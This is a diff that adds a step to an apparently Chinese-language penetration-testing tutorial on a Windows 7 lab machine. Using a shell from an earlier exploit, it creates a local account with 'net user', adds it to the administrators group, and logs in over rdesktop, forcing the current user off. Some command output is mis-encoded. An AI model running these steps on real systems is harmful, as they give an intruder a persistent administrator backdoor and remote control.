@@ -155,3 +155,19 @@ C:\Windows\system32>
 但有时候不一定会成功，会返回FAIL，
 说明这个系统打了补丁，这个漏洞已经没有威力了。
 然后可以通过命令行来进行相关的入侵操作
+11.通过rdesktop实现linux对于windows系统的远程桌面操作
+通过上面获取到的win7命令行添加新用户并设置密码
+{
+C:\Windows\system32>net user xxxx 1234 /add    （xxxx用户名 1234密码）
+net user xxxx 1234 /add
+����ɹ���ɡ�
+C:\Windows\system32>net localgroup administrators xxxx /add   （将用户设置为管理员权限）
+net localgroup administrators xxxx /add
+����ɹ���ɡ�
+C:\Windows\system32>
+}
+安装 rdesktop方法 ：sudo apt-get install rdesktop
+使用方法：rdesktop [options] server[:port]
+重新打开一个终端 rdesktop 192.168.199.137登录到win7系统，
+等待30秒win7主机那边登录的用户会被强制挤下线
+-----------------------长长的分割线-----------------------
